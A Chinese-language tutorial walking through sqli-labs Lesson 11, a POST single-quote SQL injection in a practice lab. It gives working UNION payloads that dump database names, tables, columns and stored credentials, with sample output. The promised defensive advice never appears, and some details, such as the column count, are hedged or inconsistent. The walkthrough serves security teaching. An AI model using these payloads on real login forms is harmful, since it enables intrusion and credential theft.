# Sqli-Labs Lesson 11：POST 单引号字符型注入复现与防护建议

### sqli-labs Lesson 11 漏洞复现

Lesson 11 是 **基于POST请求的单引号字符型SQL注入**，核心场景是登录表单的用户名/密码参数存在注入漏洞，属于最典型的POST注入场景之一。下面我会从环境准备、漏洞分析、分步复现三个维度完整演示，确保你能跟着操作。

---

## 一、漏洞分析

Lesson 11的核心SQL语句（后端源码）：

```PHP

$uname = $_POST['uname'];
$passwd = $_POST['passwd'];
$sql = "SELECT * FROM users WHERE username='$uname' AND password='$passwd' LIMIT 0,1";
```

- 用户名/密码参数直接拼接进SQL语句，且用**单引号**包裹；

- 无任何过滤，属于典型的**字符型POST注入**；

- 注入点在`uname`或`passwd`参数（优先用`uname`）。

---

## 二、漏洞复现步骤

### 步骤1：抓包确认POST请求（关键）

因为是POST注入，浏览器无法直接在URL传参，需要用Burp Suite抓包：

1. 配置Burp Suite代理（浏览器代理设为[127.0.0.1:8080](127.0.0.1:8080)）；

2. 在Lesson 11表单中随便输入（如`test/test`），点击`Submit`提交；

3. Burp Suite会抓到POST请求，Raw内容如下：

```Plain Text

POST /sqli-labs/Less-11/ HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

uname=test&passwd=test&submit=Submit
```

1. 将该请求发送到`Repeater`（右键→Send to Repeater），后续注入操作都在Repeater中完成。

### 步骤2：判断注入点和注入类型

在Repeater中修改`uname`参数，测试单引号闭合：

- 测试1：`uname=test'&passwd=test&submit=Submit`响应返回MySQL错误：`You have an error in your SQL syntax; check the manual...`（单引号未闭合，语法错误）；

- 测试2：`uname=test' --+&passwd=test&submit=Submit`响应无错误（`--+`是MySQL注释符，闭合了单引号并注释后续内容）；

- 结论：`uname`是**单引号字符型注入点**。

### 步骤3：爆数据库名

构造注入语句，查询当前数据库名：

```Plain Text

uname=test' UNION SELECT 1,database() --+&passwd=test&submit=Submit
```

- 解释：

    - `UNION SELECT`：联合查询（需保证前后查询列数一致，原SQL查`users`表，列数为3？实际测试Lesson 11原查询返回2列（username/password），所以用`1,database()`）；

    - `database()`：MySQL内置函数，返回当前数据库名；

    - `--+`：注释掉后续的`AND password='test'`。

发送请求后，响应页面会显示当前数据库名：`security`（sqli-labs的默认数据库）。

### 步骤4：爆表名

查询`security`数据库下的所有表名：

```Plain Text

uname=test' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema='security' --+&passwd=test&submit=Submit
```

- 关键函数：

    - `information_schema.tables`：MySQL系统表，存储所有表信息；

    - `group_concat()`：将多行结果拼接为一行，方便查看；

    - `table_schema='security'`：指定数据库名。

响应返回表名：`emails,referers,uagents,users`（核心表是`users`，存储账号密码）。

### 步骤5：爆字段名

查询`users`表的所有字段名：

```Plain Text

uname=test' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users' --+&passwd=test&submit=Submit
```

- `information_schema.columns`：MySQL系统表，存储所有字段信息；

- `table_name='users'`：指定表名。

响应返回字段名：`id,username,password`（核心字段是`username`和`password`）。

### 步骤6：爆账号密码

查询`users`表中的所有账号密码：

```Plain Text

uname=test' UNION SELECT 1,group_concat(username,':',password) FROM security.users --+&passwd=test&submit=Submit
```

- `group_concat(username,':',password)`：拼接用户名和密码，格式如`admin:password`。

响应返回结果示例：

```Plain Text

Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dhakkan,admin4:admin4
```

---

## 三、简化复现（无需Burp，用浏览器插件）

如果没有Burp Suite，可使用浏览器插件（如PostMan、HackBar）发送POST请求：

1. 安装HackBar插件（Chrome/Firefox）；

2. 打开Lesson 11页面，激活HackBar；

3. 选择POST模式，输入参数：

    ```Plain Text
    
    uname=test' UNION SELECT 1,group_concat(username,':',password) FROM security.users --+&passwd=test&submit=Submit
    ```

4. 点击`Execute`执行，即可看到注入结果。

---

### 总结

1. Lesson 11核心是**POST单引号字符型注入**，区别于GET注入的关键是参数通过POST体传递，需抓包/插件辅助；

2. 注入核心逻辑：用单引号闭合→注释符截断后续语句→UNION联合查询获取数据库信息；

3. 关键函数：`database()`（当前库）、`group_concat()`（多行拼接）、`information_schema`（系统表）。
> （注：文档部分内容可能由 AI 生成）